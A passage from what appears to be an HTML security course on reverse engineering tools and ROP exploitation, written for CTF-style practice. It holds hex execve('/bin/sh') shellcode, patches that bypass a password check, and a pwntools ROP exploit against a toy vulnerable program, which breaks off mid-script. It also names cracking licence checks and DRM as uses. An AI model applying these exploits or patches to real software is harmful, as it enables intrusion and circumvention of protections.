# 6. Console (bottom)
# Error messages, script output

# Navigation:
# ‚Ä¢ Double-click function name ‚Üí jumps to function
# ‚Ä¢ Press G ‚Üí Go to address
# ‚Ä¢ Press F ‚Üí Find bytes/text
# ‚Ä¢ Press ; ‚Üí Add comment
# ‚Ä¢ Press L ‚Üí Rename variable/function
# ‚Ä¢ Press ‚Üí ‚Üí Follow reference
# ‚Ä¢ Press ‚Üê ‚Üí Go back

# Keyboard shortcuts:
# G ‚Üí Go to address
# F ‚Üí Search
# L ‚Üí Rename
# ; ‚Üí Comment
# Ctrl+Shift+E ‚Üí Edit function signature
# D ‚Üí Data type (convert bytes to string, int, etc.)
# U ‚Üí Undefined (undefine instruction/data)
# P ‚Üí Create function
# Right-click ‚Üí References to ‚Üí See where used</div>

            <h4>Real Example: Reversing crackme Binary</h4>

            <div class="code"># Download practice crackme:
wget https://crackmes.one/static/crackme/5b8a37a433c5d45fc286ad83.zip
unzip 5b8a37a433c5d45fc286ad83.zip
chmod +x crackme

# Run it:
./crackme
# Enter password: test
# Output: Wrong password!

# Import into Ghidra:
# File ‚Üí Import File ‚Üí crackme

# Auto-analyze

# Find main function:
# Symbol Tree ‚Üí Functions ‚Üí main (or entry)

# Look at decompiled code:

# undefined8 main(void)
# {
#   char input [32];
#   
#   printf("Enter password: ");
#   scanf("%s", input);
#   
#   if (strcmp(input, "sup3rs3cr3t") == 0) {
#     printf("Correct! Flag: flag{you_did_it}\n");
#   } else {
#     printf("Wrong password!\n");
#   }
#   
#   return 0;
# }

# Found it! Password is: sup3rs3cr3t

# Try it:
./crackme
# Enter password: sup3rs3cr3t
# Correct! Flag: flag{you_did_it}

# More complex scenario: Obfuscated password check

# Decompiled code might show:
# if ((((input[0] ^ 0x42) == 0x11) && ((input[1] ^ 0x42) == 0x27)) &&
#     (((input[2] ^ 0x42) == 0x21 && ((input[3] ^ 0x42) == 0x21)))) {
#   printf("Correct!\n");
# }

# Solve with Python:
# >>> chr(0x11 ^ 0x42)
# 'S'
# >>> chr(0x27 ^ 0x42)
# 'e'
# >>> chr(0x21 ^ 0x42)
# 'c'
# >>> chr(0x21 ^ 0x42)
# 'c'
# Password: Secc</div>

            <h4>Ghidra Scripting with Python</h4>

            <div class="code"># Ghidra supports Python and Java scripts
# Automate analysis tasks!

# Create script:
# Window ‚Üí Script Manager ‚Üí New Script
# Name: find_strings.py
# Language: Python

# Example script - Find all strings containing "password":

from ghidra.program.model.listing import CodeUnitFormat

currentProgram = getCurrentProgram()
listing = currentProgram.getListing()

# Get all strings
string_list = []
for string in currentProgram.getListing().getDefinedData(True):
    if string.getDataType().getName() == "string":
        string_list.append(string.getValue())

# Filter for "password"
for s in string_list:
    if "password" in s.lower():
        print("Found: {}".format(s))

# Run script:
# Script Manager ‚Üí find_strings.py ‚Üí Run

# Output:
# Found: Enter password:
# Found: Wrong password!
# Found: hardcoded_password_123

# Advanced script - Rename all functions with their string references:

from ghidra.program.model.symbol import RefType

def rename_functions_by_strings():
    fm = currentProgram.getFunctionManager()
    functions = fm.getFunctions(True)  # Get all functions
    
    for func in functions:
        # Get all references from this function
        refs = func.getBody().getAddresses(True)
        for addr in refs:
            data = listing.getDataAt(addr)
            if data and data.getDataType().getName() == "string":
                string_val = data.getValue()
                # Rename function
                new_name = "func_" + string_val[:20].replace(" ", "_")
                func.setName(new_name, ghidra.program.model.symbol.SourceType.USER_DEFINED)
                print("Renamed to: {}".format(new_name))
                break

rename_functions_by_strings()

# This auto-renames functions based on strings they use!</div>

            <h3>Part 2: radare2 - Command-Line RE Framework</h3>

            <p><strong>radare2</strong> (r2) is a powerful command-line reverse engineering framework. It's fast, scriptable, and works over SSH!</p>

            <div class="code"># Install radare2:
sudo apt install radare2

# Or latest version:
git clone https://github.com/radareorg/radare2
cd radare2
sys/install.sh

# Verify:
r2 -v
# radare2 5.8.8 @ linux-x86-64

# Open binary:
r2 /bin/ls

# Or with write mode (allows patching):
r2 -w /tmp/crackme

# Basic r2 commands:

# Analyze all:
[0x00000000]> aaa

# Output:
# [x] Analyze all flags starting with sym. and entry0 (aa)
# [x] Analyze function calls (aac)
# [x] Analyze len bytes of instructions for references (aar)
# [x] Finding and parsing C++ vtables (avrr)
# [x] Skipping function emulation in debugger (aaef)
# [x] Analyzing function calls in rtti sections (aafr)
# [x] Type matching analysis for all functions (aaft)
# [x] Propagate noreturn information (aanr)
# [x] Use -AA or aaaa to perform additional experimental analysis

# List functions:
[0x00000000]> afl

# Output:
# 0x00401000    1 42           entry0
# 0x00401030    1 6            sym.imp.printf
# 0x00401040    1 6            sym.imp.scanf
# 0x00401050    4 50   -> 40   main

# Disassemble function:
[0x00000000]> pdf @ main

# Output:
# ‚îå 50: int main (int argc, char **argv);
# ‚îÇ           ; DATA XREF from entry0 @ 0x401016
# ‚îÇ           0x00401050      55             push rbp
# ‚îÇ           0x00401051      4889e5         mov rbp, rsp
# ‚îÇ           0x00401054      4883ec20       sub rsp, 0x20
# ‚îÇ           0x00401058      488d3dc90000.  lea rdi, str.Enter_password:
# ‚îÇ           0x0040105f      e8ccffffff     call sym.imp.printf
# ‚îÇ           0x00401064      488d45e0       lea rax, [rbp - 0x20]
# ‚îÇ           0x00401068      4889c6         mov rsi, rax
# ‚îÇ           0x0040106b      488d3dc10000.  lea rdi, 0x00401033
# ‚îÇ           0x00401072      b800000000     mov eax, 0
# ‚îÇ           0x00401077      e8c4ffffff     call sym.imp.scanf

# Decompile to pseudo-C:
[0x00000000]> pdc @ main

# Output (pseudo-C):
# void main (void) {
#     char *input;
#     printf("Enter password: ");
#     scanf("%s", &input);
#     if (strcmp(input, "sup3rs3cr3t") == 0) {
#         printf("Correct!\n");
#     } else {
#         printf("Wrong!\n");
#     }
# }

# Search for strings:
[0x00000000]> iz

# Output:
# [Strings]
# Num Paddr      Vaddr      Len Size Section  Type  String
# 000 0x00002008 0x00402008  15  16 (.rodata) ascii Enter password:
# 001 0x00002018 0x00402018  11  12 (.rodata) ascii sup3rs3cr3t
# 002 0x00002024 0x00402024   8   9 (.rodata) ascii Correct!

# Search for hex bytes:
[0x00000000]> /x 4889e5

# Find references to address:
[0x00000000]> axt 0x00402018

# Output:
# main 0x401058 [DATA] lea rdi, str.sup3rs3cr3t

# Visual mode (TUI interface):
[0x00000000]> V

# Then press:
#   p ‚Üí cycle views (hex, disasm, decompiler)
#   : ‚Üí command mode
#   q ‚Üí quit visual mode</div>

            <h4>Binary Patching with radare2</h4>

            <div class="code"># Open binary in write mode:
r2 -w crackme

# Find password check:
[0x00000000]> aaa
[0x00000000]> pdf @ main

# Let's say at 0x401077 there's:
# 0x00401077      e8c4ffffff     call sym.strcmp
# 0x0040107c      85c0           test eax, eax
# 0x0040107e      7510           jne 0x401090  ‚Üê Jump if NOT equal

# Patch JNE to JE (jump if equal ‚Üí always jump):
[0x00000000]> s 0x0040107e
[0x0040107e]> pd 1

# Output:
# 0x0040107e      7510           jne 0x401090

# Write new instruction (JE = 0x74):
[0x0040107e]> wx 7510

# Wait, that's the same! Let's NOP it instead:
[0x0040107e]> wx 9090

# Or make it always jump (change JNE to JMP):
[0x0040107e]> wa jmp 0x401090

# Verify:
[0x0040107e]> pd 1
# 0x0040107e      eb10           jmp 0x401090

# Save and quit:
[0x0040107e]> q

# Now any password works!
./crackme
# Enter password: wrong
# Correct!

# More patching examples:

# NOP out entire function call:
[0x00000000]> s 0x401077
[0x00000000]> wx 9090909090  # 5 NOPs (5-byte call instruction)

# Change string:
[0x00000000]> s 0x402018  # Address of "sup3rs3cr3t"
[0x00402018]> w hello
[0x00402018]> ps  # Print string
# hello

# Write shellcode:
[0x00000000]> wx 31c048bbd19d9691d08c97ff48f7db53545f995257545e0f05
# (x64 execve("/bin/sh") shellcode)</div>

            <h4>radare2 Essential Commands Cheat Sheet</h4>

            <div class="info-box">
                <h4>r2 Command Reference</h4>
                <p><strong>Analysis:</strong><br>
                ‚Ä¢ <code>aa</code> - Analyze all functions<br>
                ‚Ä¢ <code>aaa</code> - Analyze all (deep)<br>
                ‚Ä¢ <code>aaaa</code> - Analyze all + experimental<br>
                ‚Ä¢ <code>afl</code> - List functions<br>
                ‚Ä¢ <code>afi</code> - Function info<br>
                ‚Ä¢ <code>afn newname</code> - Rename function<br><br>
                <strong>Disassembly:</strong><br>
                ‚Ä¢ <code>pdf</code> - Print disassembly of function<br>
                ‚Ä¢ <code>pd 20</code> - Print 20 instructions<br>
                ‚Ä¢ <code>pdc</code> - Print decompiled C<br>
                ‚Ä¢ <code>px 100</code> - Print 100 bytes hex<br><br>
                <strong>Navigation:</strong><br>
                ‚Ä¢ <code>s main</code> - Seek to main<br>
                ‚Ä¢ <code>s 0x401000</code> - Seek to address<br>
                ‚Ä¢ <code>s+ 10</code> - Seek forward 10 bytes<br>
                ‚Ä¢ <code>s-</code> - Undo seek<br><br>
                <strong>Searching:</strong><br>
                ‚Ä¢ <code>/ password</code> - Search string<br>
                ‚Ä¢ <code>/x 4889e5</code> - Search hex<br>
                ‚Ä¢ <code>iz</code> - List strings<br>
                ‚Ä¢ <code>axt</code> - Cross-references to<br><br>
                <strong>Patching:</strong><br>
                ‚Ä¢ <code>wx 9090</code> - Write hex<br>
                ‚Ä¢ <code>wa jmp 0x401000</code> - Write assembly<br>
                ‚Ä¢ <code>w hello</code> - Write string<br><br>
                <strong>Visual mode:</strong><br>
                ‚Ä¢ <code>V</code> - Enter visual mode<br>
                ‚Ä¢ <code>VV</code> - Visual graph mode<br>
                ‚Ä¢ <code>p</code> - Cycle views<br>
                ‚Ä¢ <code>:</code> - Command mode</p>
            </div>

            <h3>Part 3: Binary Ninja - Modern RE Platform</h3>

            <p><strong>Binary Ninja</strong> (binja) is a modern, commercial reverse engineering platform with beautiful UI and powerful IL (Intermediate Language) analysis. It has a free "Cloud" version and paid Personal ($299) and Commercial ($3999) licenses.</p>

            <div class="code"># Download Binary Ninja:
# https://binary.ninja/

# Free options:
# ‚Ä¢ Binary Ninja Cloud (browser-based, limited)
# ‚Ä¢ Binary Ninja Personal (30-day trial)

# Install on Kali:
wget https://cdn.binary.ninja/installers/binaryninja_linux_demo.zip
unzip binaryninja_linux_demo.zip
cd binaryninja
./binaryninja

# Key features over Ghidra/r2:

# 1. Clean, modern UI
# No cluttered NSA-style interface

# 2. Multiple IL views:
#   - Disassembly (raw assembly)
#   - Low-Level IL (LLIL) - architecture-independent
#   - Medium-Level IL (MLIL) - variables, expressions
#   - High-Level IL (HLIL) - pseudo-C
#   - Pseudo-C (most readable)

# 3. Workflow:
# Open binary ‚Üí Auto-analysis runs
# 
# Left panel: Function list
# Center: Disassembly/IL
# Right: Variable types, cross-references
# Bottom: Python console

# 4. IL example:
# Assembly view:
# 00401000  push    ebp
# 00401001  mov     ebp, esp
# 00401003  sub     esp, 0x20

# LLIL:
# push(ebp)
# ebp = esp
# esp = esp - 0x20

# MLIL:
# int32_t var_20

# HLIL:
# (empty - just stack setup)

# 5. Type system:
# Define struct:
# Right-click variable ‚Üí Change Type ‚Üí struct myStruct { int x; char* name; }
# Binary Ninja propagates type info everywhere!

# 6. Scripting (Python):
# View ‚Üí Python Console

# Example: Find all calls to dangerous functions

import binaryninja as binja

dangerous_funcs = ["strcpy", "gets", "sprintf"]

for func in bv.functions:
    for call_site in func.call_sites:
        call_target = call_site.function.name
        if call_target in dangerous_funcs:
            print(f"Dangerous call at {hex(call_site.address)}: {call_target}")

# Output:
# Dangerous call at 0x401234: strcpy
# Dangerous call at 0x401567: gets

# Binary Ninja plugins:
# Tools ‚Üí Manage Plugins

# Popular plugins:
# ‚Ä¢ SENinja (symbolic execution)
# ‚Ä¢ Binjago (Go reverse engineering)
# ‚Ä¢ Sourcery Pane (sync with source code)

# Limitations:
# ‚Ä¢ Expensive ($299-$3999)
# ‚Ä¢ Closed source
# ‚Ä¢ Smaller community than Ghidra

# Best for:
# ‚Ä¢ Professional reverse engineering
# ‚Ä¢ Companies with budget
# ‚Ä¢ Complex binaries needing IL analysis</div>

            <h3>Part 4: GDB Debugging - Runtime Analysis</h3>

            <p><strong>GDB</strong> (GNU Debugger) is THE standard Linux debugger. While Ghidra/r2/Binja analyze static binaries, GDB runs them and lets you control execution!</p>

            <div class="code"># GDB basics:

# Compile test program with debug symbols:
cat > test.c << 'EOF'
#include <stdio.h>

int add(int a, int b) {
    return a + b;
}

int main() {
    int x = 5;
    int y = 10;
    int result = add(x, y);
    printf("Result: %d\n", result);
    return 0;
}
EOF

gcc -g test.c -o test  # -g = include debug symbols

# Start GDB:
gdb ./test

# GDB commands:

# List source code:
(gdb) list

# Output:
# 3       int add(int a, int b) {
# 4           return a + b;
# 5       }
# 6
# 7       int main() {
# 8           int x = 5;
# 9           int y = 10;
# 10          int result = add(x, y);

# Set breakpoint:
(gdb) break main
# Breakpoint 1 at 0x401136: file test.c, line 8.

# Or by line number:
(gdb) break 10

# Or by address:
(gdb) break *0x401136

# Run program:
(gdb) run

# Output:
# Starting program: /root/test
# Breakpoint 1, main () at test.c:8
# 8           int x = 5;

# Step through code:
(gdb) next  # Execute one line (step over functions)
# 9           int y = 10;

(gdb) next
# 10          int result = add(x, y);

(gdb) step  # Step INTO function
# add (a=5, b=10) at test.c:4
# 4           return a + b;

# Print variables:
(gdb) print x
# $1 = 5

(gdb) print y
# $2 = 10

(gdb) print result
# $3 = 0  (not set yet)

# Continue execution:
(gdb) continue
# Result: 15
# [Inferior 1 (process 1234) exited normally]

# Examining memory:
(gdb) x/4x $rsp  # Examine 4 hex words at stack pointer
# 0x7fffffffe000: 0x00000000 0x00000001 0xffffe010 0x00007fff

(gdb) x/s 0x402000  # Examine string at address
# 0x402000: "Hello World"

# Modify variables:
(gdb) set variable x = 100

# Call functions:
(gdb) call printf("Debug message\n")
# Debug message

# Disassemble:
(gdb) disassemble main
# Dump of assembler code for function main:
#    0x0000000000401130 <+0>:     push   %rbp
#    0x0000000000401131 <+1>:     mov    %rsp,%rbp
#    0x0000000000401134 <+4>:     sub    $0x10,%rsp</div>

            <h4>GDB with PEDA/GEF/Pwndbg Extensions</h4>

            <div class="code"># GDB is powerful but ugly. Extensions make it beautiful!

# PEDA (Python Exploit Development Assistance):
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# GEF (GDB Enhanced Features):
wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py
echo "source ~/.gdbinit-gef.py" >> ~/.gdbinit

# Pwndbg (Exploit Development):
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Features these add:

# 1. Beautiful UI with colors
# ‚Ä¢ Registers displayed with colors (red = changed)
# ‚Ä¢ Stack view with annotations
# ‚Ä¢ Code context around current instruction

# 2. Exploit development commands:

# Find ROP gadgets:
(gdb) rop --search "pop rdi"
# 0x00401234: pop rdi; ret
# 0x00401567: pop rdi; pop rsi; ret

# Search for strings:
(gdb) searchmem "password"
# [stack] 0x7fffffffe100 0x7fffffffe110 "password123"

# Pattern create (find offset for buffer overflow):
(gdb) pattern create 200
# Generate: Aa0Aa1Aa2Aa3...

# After crash:
(gdb) pattern offset $rsp
# Offset: 72 (crash happens at byte 72)

# Check security features:
(gdb) checksec
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE

# Shellcode helpers:
(gdb) shellcode generate x64
# \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff...

# Heap commands:
(gdb) heap chunks
# (shows all heap allocations)

(gdb) heap bins
# (shows freed chunks in bins)</div>

            <h3>Part 5: ELF Analysis (Linux Binaries)</h3>

            <div class="code"># ELF (Executable and Linkable Format) is Linux binary format

# File command (identify binary type):
file /bin/ls

# Output:
# /bin/ls: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
# dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
# BuildID[sha1]=1234567890abcdef, for GNU/Linux 3.2.0,
# stripped

# Key info:
# ‚Ä¢ ELF 64-bit (architecture)
# ‚Ä¢ LSB (little-endian)
# ‚Ä¢ dynamically linked (uses shared libraries)
# ‚Ä¢ stripped (no debug symbols)

# readelf - Display ELF structure:

# ELF header:
readelf -h /bin/ls

# Output:
# ELF Header:
#   Magic:   7f 45 4c 46 02 01 01 00
#   Class:                             ELF64
#   Data:                              2's complement, little endian
#   Entry point address:               0x5850

# Section headers:
readelf -S /bin/ls

# Output:
#   [Nr] Name              Type             Address           Offset
#   [ 0]                   NULL             0000000000000000  00000000
#   [13] .text             PROGBITS         0000000000003000  00003000
#   [14] .fini             PROGBITS         0000000000017008  00017008
#   [23] .data             PROGBITS         0000000000019000  00019000
#   [24] .bss              NOBITS           0000000000019100  00019100

# Sections explained:
# .text     ‚Üí Executable code
# .data     ‚Üí Initialized global variables
# .rodata   ‚Üí Read-only data (strings, constants)
# .bss      ‚Üí Uninitialized global variables
# .plt      ‚Üí Procedure Linkage Table (dynamic linking)
# .got      ‚Üí Global Offset Table (dynamic linking)

# Program headers (segments):
readelf -l /bin/ls

# Output:
# Program Headers:
#   Type           Offset             VirtAddr           PhysAddr
#   LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
#   LOAD           0x0000000000003000 0x0000000000003000 0x0000000000003000
#   DYNAMIC        0x0000000000018000 0x0000000000018000 0x0000000000018000

# Symbol table (if not stripped):
readelf -s /bin/ls

# Output:
#    Num:    Value          Size Type    Bind   Vis      Ndx Name
#     55: 0000000000005850   123 FUNC    GLOBAL DEFAULT   13 main
#    123: 0000000000006500    45 FUNC    GLOBAL DEFAULT   13 read_file

# Dynamic section (imported libraries):
readelf -d /bin/ls

# Output:
#  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
#  0x0000000000000001 (NEEDED)             Shared library: [libpthread.so.0]

# objdump - Disassemble binary:

objdump -d /bin/ls | less

# Output:
# 0000000000005850 <main>:
#     5850:       55                      push   %rbp
#     5851:       48 89 e5                mov    %rsp,%rbp
#     5854:       41 57                   push   %r15

# Disassemble specific function:
objdump -d /bin/ls | grep -A 20 "<main>:"

# Show all strings:
objdump -s /bin/ls | grep -i "password"

# strings - Extract printable strings:
strings /bin/ls

# Output:
# /lib64/ld-linux-x86-64.so.2
# libc.so.6
# __cxa_finalize
# __libc_start_main
# cannot access %s
# [...]

# ldd - Show dynamic library dependencies:
ldd /bin/ls

# Output:
#     linux-vdso.so.1 (0x00007ffff7fc9000)
#     libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
#     /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)

# ltrace - Trace library calls:
ltrace ls

# Output:
# strrchr("/bin/ls", '/')                = "/ls"
# malloc(120)                            = 0x5555555592a0
# opendir(".")                           = 0x555555559750
# readdir(0x555555559750)                = 0x555555559770
# strcmp(".", ".")                       = 0
# [...]

# strace - Trace system calls:
strace ls

# Output:
# execve("/bin/ls", ["ls"], 0x7fffffffde80 /* 20 vars */) = 0
# brk(NULL)                               = 0x555555559000
# openat(AT_FDCWD, ".", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3
# [...]</div>

            <h3>Part 6: PE Analysis (Windows Binaries)</h3>

            <div class="code"># PE (Portable Executable) is Windows binary format

# Install PE tools on Kali:
sudo apt install pev

# readpe - Display PE structure:
readpe malware.exe

# Output:
# PE File Header:
#   Machine: IMAGE_FILE_MACHINE_AMD64 (x64)
#   Number of sections: 5
#   Timestamp: 2026-01-08 10:30:00 UTC
#   Entry point: 0x1400
# 
# Optional Header:
#   Magic: PE32+ (64-bit)
#   Subsystem: Windows GUI
#   DLL Characteristics: 0x8160
#     - DYNAMIC_BASE (ASLR)
#     - NX_COMPAT (DEP)
#     - TERMINAL_SERVER_AWARE

# pesec - Check security features:
pesec malware.exe

# Output:
# ASLR:               Yes
# DEP/NX:             Yes
# SEH:                Yes
# CFG:                No
# SafeSEH:            No
# Signed:             No

# pestr - Extract strings:
pestr malware.exe

# Output:
# kernel32.dll
# VirtualAlloc
# CreateThread
# C:\Windows\System32\
# http://malicious-c2.com/beacon
# [...]

# pehash - Calculate hashes:
pehash malware.exe

# Output:
# MD5:     1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
# SHA-1:   a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0
# SHA-256: abc123...

# pedis - Disassemble entry point:
pedis malware.exe

# Output:
# 0x1400: push   rbp
# 0x1401: mov    rbp, rsp
# 0x1404: sub    rsp, 0x20
# 0x1408: call   0x2000

# Use Ghidra for deeper PE analysis:
# Import PE ‚Üí Ghidra auto-detects:
#   - Import Address Table (IAT)
#   - Export Address Table (EAT)
#   - Resources (icons, dialogs, strings)
#   - TLS callbacks
#   - Exception handlers

# Common PE sections:
# .text     ‚Üí Code
# .data     ‚Üí Initialized data
# .rdata    ‚Üí Read-only data (import table, string literals)
# .bss      ‚Üí Uninitialized data
# .rsrc     ‚Üí Resources (icons, dialogs, bitmaps)
# .reloc    ‚Üí Relocation table (for ASLR)

# Packed PE detection:
# If .text section has high entropy (7.5+) ‚Üí likely packed

# Unpacking with UPX:
upx -d malware.exe -o malware_unpacked.exe

# If different packer:
# ‚Ä¢ Run in debugger, let it unpack itself
# ‚Ä¢ Dump memory after unpacking
# ‚Ä¢ Use automated unpackers (de4dot for .NET)</div>

            <div class="metaphor-box">
                <h4>üéâ You're a Reverse Engineering Expert!</h4>
                <p>You've mastered:<br><br>
                ‚úÖ <strong>Ghidra:</strong> NSA's free RE suite, decompilation, scripting, project management<br>
                ‚úÖ <strong>radare2:</strong> Command-line beast, disassembly, patching, portable analysis<br>
                ‚úÖ <strong>Binary Ninja:</strong> Modern platform, IL analysis, clean UI<br>
                ‚úÖ <strong>GDB:</strong> Runtime debugging, breakpoints, PEDA/GEF/Pwndbg extensions<br>
                ‚úÖ <strong>ELF Analysis:</strong> Linux binaries, readelf, objdump, sections, segments<br>
                ‚úÖ <strong>PE Analysis:</strong> Windows binaries, pev tools, security features<br><br>
                <strong>RE Workflow:</strong><br>
                1. <strong>Reconnaissance:</strong> file, strings, readelf/readpe, checksec<br>
                2. <strong>Static analysis:</strong> Ghidra/r2/Binja ‚Üí understand logic<br>
                3. <strong>Dynamic analysis:</strong> GDB ‚Üí observe runtime behavior<br>
                4. <strong>Exploitation:</strong> Find vulns, craft exploits, patch binaries<br><br>
                <strong>Real-world applications:</strong><br>
                ‚Ä¢ <strong>Malware analysis:</strong> Understand what virus/ransomware does<br>
                ‚Ä¢ <strong>Vulnerability research:</strong> Find 0-days in proprietary software<br>
                ‚Ä¢ <strong>Cracking:</strong> Bypass license checks, DRM, authentication<br>
                ‚Ä¢ <strong>Protocol RE:</strong> Reverse engineer network protocols<br>
                ‚Ä¢ <strong>Interoperability:</strong> Make closed-source software work with your tools<br>
                ‚Ä¢ <strong>CTFs:</strong> Reverse engineering challenges<br><br>
                <strong>Next steps:</strong><br>
                ‚Ä¢ Practice on crackmes.one (100+ challenges)<br>
                ‚Ä¢ Analyze real malware (use VM!)<br>
                ‚Ä¢ Learn x86/x64 assembly deeply<br>
                ‚Ä¢ Study common vulnerability patterns (buffer overflow, integer overflow, format string)<br>
                ‚Ä¢ Contribute to Ghidra/r2 plugins<br><br>
                Every binary is a puzzle waiting to be solved. You now have the tools! üß©üîì</p>
            </div>
        </section>

        <!-- SECTION 7: Advanced Exploitation Techniques -->
        <section id="advanced-exploitation" class="section">
            <h2 class="section-title">Advanced Exploitation Techniques</h2>
            <p class="section-intro">You know buffer overflows from Bonus B1. Now we go DEEP: ROP chains (Return-Oriented Programming), heap exploitation, kernel exploits, and fuzzing. Modern binaries have defenses: DEP/NX (no code execution on stack), ASLR (randomized addresses), stack canaries (overflow detection), PIE (position-independent code). Simple stack smashing doesn't work anymore! Advanced exploitation bypasses ALL these protections. This section covers how modern exploits work, how attackers chain vulnerabilities, and how to find 0-days with fuzzing. By the end, you'll understand CVEs you see in the news!</p>

            <div class="metaphor-box">
                <h4>üí° Modern Exploitation = Chess, Not Checkers</h4>
                <p>Old-school exploitation (1990s-2000s):<br>
                1. Find buffer overflow<br>
                2. Overwrite return address<br>
                3. Point to shellcode on stack<br>
                4. Win!<br><br>
                Modern exploitation (2010s-now):<br>
                1. <strong>Stack canary blocks overflow</strong> ‚Üí Leak canary first<br>
                2. <strong>DEP/NX prevents shellcode execution</strong> ‚Üí Use ROP chains instead<br>
                3. <strong>ASLR randomizes addresses</strong> ‚Üí Leak libc address, calculate offsets<br>
                4. <strong>PIE randomizes code</strong> ‚Üí Leak code address too<br>
                5. Chain all these together ‚Üí Win!<br><br>
                You can't just "overflow and win" anymore. Modern exploits are multi-stage puzzles requiring information leaks, gadget chaining, and creative thinking. It's beautiful! üß©</p>
            </div>

            <h3>Part 1: ROP (Return-Oriented Programming)</h3>

            <h4>The Problem: DEP/NX Prevents Shellcode Execution</h4>

            <div class="info-box">
                <h4>What is DEP/NX?</h4>
                <p><strong>DEP</strong> (Data Execution Prevention - Windows) / <strong>NX</strong> (No-eXecute - Linux) marks memory pages as either writable OR executable, never both!<br><br>
                <strong>Traditional stack-based shellcode:</strong><br>
                1. Write shellcode to stack (writable memory)<br>
                2. Jump to stack<br>
                3. Execute shellcode<br><br>
                <strong>With NX enabled:</strong><br>
                Stack is writable but NOT executable ‚Üí Segmentation fault!<br><br>
                <strong>Check if binary has NX:</strong><br>
                <code>checksec --file=./vuln</code><br>
                Output: <code>NX: NX enabled</code><br><br>
                <strong>Solution:</strong> Don't execute our own code. Instead, chain together existing executable code ("gadgets") to build exploitation!</p>
            </div>

            <h4>ROP Gadgets Explained</h4>

            <div class="code"># A "gadget" is a sequence of instructions ending in RET

# Example gadgets from libc:

# Gadget 1:
0x00401234: pop rdi ; ret

# Gadget 2:
0x00401567: pop rsi ; ret

# Gadget 3:
0x004018ab: pop rdx ; ret

# Gadget 4:
0x00405678: pop rax ; ret

# Gadget 5:
0x00408901: syscall ; ret

# Why gadgets work:
# 1. They're in .text section (executable!)
# 2. We control the stack (writable!)
# 3. RET instruction pops address from stack and jumps there
# 4. We can chain gadgets by placing their addresses on stack!

# ROP chain to call system("/bin/sh"):

# Goal:
# rdi = pointer to "/bin/sh"  (first argument)
# rsi = 0                     (second argument)
# rdx = 0                     (third argument)
# rax = 59                    (syscall number for execve)
# syscall

# Stack layout:
# [buffer padding]
# [address of "pop rdi; ret"]     ‚Üê return address (after overflow)
# [address of "/bin/sh"]          ‚Üê will be popped into rdi
# [address of "pop rsi; ret"]     ‚Üê after first gadget returns
# [0x0]                           ‚Üê will be popped into rsi
# [address of "pop rdx; ret"]
# [0x0]                           ‚Üê will be popped into rdx
# [address of "pop rax; ret"]
# [59]                            ‚Üê execve syscall number
# [address of "syscall"]          ‚Üê triggers execve!

# Execution flow:
# 1. Buffer overflow overwrites return address ‚Üí points to first gadget
# 2. First gadget: pop rdi; ret
#    - Pops next stack value into rdi ("/bin/sh" address)
#    - Returns to next stack value (second gadget)
# 3. Second gadget: pop rsi; ret
#    - Pops 0 into rsi
#    - Returns to third gadget
# 4. ... continues ...
# 5. Final gadget: syscall
#    - Executes syscall with our controlled registers!
#    - Shell spawned! üéâ</div>

            <h4>Finding ROP Gadgets</h4>

            <div class="code"># Tool 1: ROPgadget (best tool!)

sudo apt install python3-ropgadget

# Find gadgets in binary:
ROPgadget --binary ./vuln

# Output (thousands of gadgets):
# 0x00401234 : pop rdi ; ret
# 0x00401567 : pop rsi ; ret
# 0x004018ab : pop rdx ; ret
# 0x00405678 : pop rax ; ret
# 0x00408901 : syscall
# [... 2000+ more gadgets ...]

# Find specific gadget:
ROPgadget --binary ./vuln --only "pop|ret"

# Find gadgets containing "rdi":
ROPgadget --binary ./vuln | grep rdi

# Find gadgets in libc (more gadgets!):
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6

# Tool 2: ropper

sudo apt install ropper

ropper --file ./vuln

# Interactive mode:
(ropper)> search pop rdi
# [INFO] Searching for gadgets: pop rdi

# 0x00401234: pop rdi; ret

(ropper)> search syscall
# 0x00408901: syscall; ret

# Tool 3: pwntools (Python library)

from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# Automatically find gadgets:
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
print(f"pop rdi; ret ‚Üí {hex(pop_rdi)}")

# Or use pwntools to build ROP chain automatically:
rop.call('system', ['/bin/sh'])
print(rop.dump())

# Pwntools assembles entire chain for you!</div>

            <h4>Example: Complete ROP Exploit</h4>

            <div class="code"># Vulnerable program (vuln.c):
cat > vuln.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buffer[64];
    read(0, buffer, 200);  // Buffer overflow!
}

int main() {
    vuln();
    return 0;
}
EOF

# Compile without stack canary, with NX:
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie
# Wait, we want NX enabled, not execstack!
gcc vuln.c -o vuln -fno-stack-protector -no-pie

# Verify NX enabled:
checksec --file=./vuln
# Output: NX: NX enabled

# Python exploit (exploit.py):
cat > exploit.py << 'EOF'
#!/usr/bin/env python3
from pwn import *

# Setup
elf = ELF('./vuln')
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./vuln')

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Build ROP chain
offset = 72  # Buffer size + saved RBP
payload = b'A' * offset

# Call system("/bin/sh")
# Need: rdi = address of "/bin/sh"
binsh = next(libc.search(b'/bin/sh'))  # Find "/bin/sh" in libc
system = libc.sym['system']

payload += p64(pop_rdi)       # pop rdi; ret
payload += p64(binsh)         # address of "/bin/sh"
payload += p64(system)        # call system()

# Send exploit
p.send(payload)

# Interact with shell
